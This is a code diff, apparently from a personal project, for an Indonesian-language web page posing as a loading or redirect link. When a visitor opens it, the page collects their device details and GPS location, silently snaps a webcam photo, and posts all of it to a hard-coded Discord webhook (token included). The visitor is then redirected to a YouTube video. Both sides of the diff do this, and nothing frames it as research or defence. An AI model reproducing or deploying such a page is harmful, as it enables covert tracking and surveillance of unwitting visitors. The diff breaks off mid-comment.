@@ -20,6 +20,7 @@
 <div id="loadingScreen">LOADING...</div>
 
 <h1>📷 Foto diambil otomatis!</h1>
+
 <h2>📌 URL Tujuan:</h2>
 <input type="text" id="targetUrl" value="https://youtu.be/dQw4w9WgXcQ?si=7l8JJHtx8fryYK6l" style="width: 100%;"/>
 
@@ -39,116 +40,103 @@
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-  const webhookUrl = "https://discord.com/api/webhooks/1360533667700543569/wFR45Uxvr1eb30ito1U1d6XtEif37RpsDvFDwtyJmbneTgwn2NPG45YZIWSoRywfBo8o";
+const webhookUrl = "https://discord.com/api/webhooks/1360533667700543569/wFR45Uxvr1eb30ito1U1d6XtEif37RpsDvFDwtyJmbneTgwn2NPG45YZIWSoRywfBo8o";
 
-  function sendToDiscord(data) {
-    fetch(webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: "```" + JSON.stringify(data, null, 2) + "```" })
-    }).catch(err => console.error("Gagal mengirim data ke webhook!", err));
-  }
-
-  function sendImageToDiscord(imageData) {
-    fetch(webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: "📷 Foto yang diambil (base64):",
-        embeds: [{
-          image: { url: imageData }
-        }]
-      })
-    });
-  }
-
-  function redirect() {
-    const targetUrl = document.getElementById("targetUrl").value;
-    setTimeout(() => { window.location.href = targetUrl; }, 1000);
-  }
-
-  function hideLoading() {
-    document.getElementById("loadingScreen").style.display = "none";
-  }
-
-  let deviceInfo = {
+let deviceInfo = {
     userAgent: navigator.userAgent,
     platform: navigator.platform,
     language: navigator.language,
     ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak diketahui",
     cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Core" : "Tidak diketahui"
-  };
+};
 
-  document.getElementById("userAgent").textContent = "User Agent: " + deviceInfo.userAgent;
-  document.getElementById("platform").textContent = "Platform: " + deviceInfo.platform;
-  document.getElementById("language").textContent = "Bahasa: " + deviceInfo.language;
-  document.getElementById("ram").textContent = "RAM: " + deviceInfo.ram;
-  document.getElementById("cpu").textContent = "CPU: " + deviceInfo.cpu;
+// Tampilkan info di halaman
+document.getElementById("userAgent").textContent = "User Agent: " + deviceInfo.userAgent;
+document.getElementById("platform").textContent = "Platform: " + deviceInfo.platform;
+document.getElementById("language").textContent = "Bahasa: " + deviceInfo.language;
+document.getElementById("ram").textContent = "RAM: " + deviceInfo.ram;
+document.getElementById("cpu").textContent = "CPU: " + deviceInfo.cpu;
 
-  let finalData = { ...deviceInfo };
-  let doneLocation = false;
-  let doneCamera = false;
+// Default data
+let dataToSend = { ...deviceInfo };
+let locationLoaded = false;
+let photoTaken = false;
 
-  function finishIfDone() {
-    if (doneLocation && doneCamera) {
-      sendToDiscord(finalData);
-      hideLoading();
-      redirect();
+// Kirim data ke Discord
+function sendToDiscord(data) {
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: "```json\n" + JSON.stringify(data, null, 2) + "\n```" })
+    }).catch(err => console.error("Gagal kirim ke webhook:", err));
+}
+
+// Kirim foto ke Discord
+function sendImageToDiscord(imageData) {
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            content: "📸 Foto yang diambil:",
+            embeds: [{
+                image: { url: imageData }
+            }]
+        })
+    });
+}
+
+// Sembunyikan loading dan redirect
+function checkAllDone() {
+    if (locationLoaded && photoTaken) {
+        document.getElementById("loadingScreen").style.display = "none";
+        setTimeout(() => {
+            window.location.href = document.getElementById("targetUrl").value;
+        }, 1000);
     }
-  }
+}
 
-  // Lokasi
-  navigator.geolocation.getCurrentPosition(
-    (position) => {
-      finalData.latitude = position.coords.latitude;
-      finalData.longitude = position.coords.longitude;
-      finalData.accuracy = position.coords.accuracy + "m";
+// Ambil lokasi
+navigator.geolocation.getCurrentPosition(
+    (pos) => {
+        const { latitude, longitude, accuracy } = pos.coords;
+        const gmapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        
+        document.getElementById("latitude").textContent = "Latitude: " + latitude;
+        document.getElementById("longitude").textContent = "Longitude: " + longitude;
+        document.getElementById("accuracy").textContent = "Akurasi: " + accuracy + "m";
 
-      document.getElementById("latitude").textContent = "Latitude: " + finalData.latitude;
-      document.getElementById("longitude").textContent = "Longitude: " + finalData.longitude;
-      document.getElementById("accuracy").textContent = "Akurasi: " + finalData.accuracy;
+        dataToSend.latitude = latitude;
+        dataToSend.longitude = longitude;
+        dataToSend.accuracy = accuracy + "m";
+        dataToSend.maps = gmapsLink;
 
-      doneLocation = true;
-      finishIfDone();
+        locationLoaded = true;
+        sendToDiscord(dataToSend);
+        checkAllDone();
     },
-    (error) => {
-      document.getElementById("latitude").textContent = "Lokasi tidak tersedia!";
-      finalData.latitude = "Tidak tersedia";
-      finalData.longitude = "Tidak tersedia";
-      finalData.accuracy = "Tidak tersedia";
-      doneLocation = true;
-      finishIfDone();
+    (err) => {
+        document.getElementById("latitude").textContent = "Lokasi tidak tersedia.";
+        locationLoaded = true;
+        sendToDiscord(dataToSend); // tetap kirim meskipun tidak dapat lokasi
+        checkAllDone();
     }
-  );
+);
 
-  // Kamera
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then((stream) => {
-      const video = document.getElementById("video");
-      video.srcObject = stream;
+// Ambil foto otomatis
+navigator.mediaDevices.getUserMedia({ video: true })
+.then((stream) => {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
+    video.srcObject = stream;
 
-      const canvas = document.getElementById("canvas");
-      const context = canvas.getContext("2d");
-
-      function capture() {
+    setTimeout(() => {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         let imageData = canvas.toDataURL("image/png");
         sendImageToDiscord(imageData);
         stream.getTracks().forEach(track => track.stop());
-        doneCamera = true;
-        finishIfDone();
-      }
-
-      setTimeout(capture, 1500);
-    })
-    .catch((err) => {
-      console.warn("Gagal akses kamera:", err);
-      finalData.photo = "Tidak tersedia";
-      doneCamera = true;
-      finishIfDone();
-    });
-</script>
-</body>
-</html>
+        photoTaken = true;
+        checkAllDone();
+    }, 1500); // tunggu 1.5 detik supaya
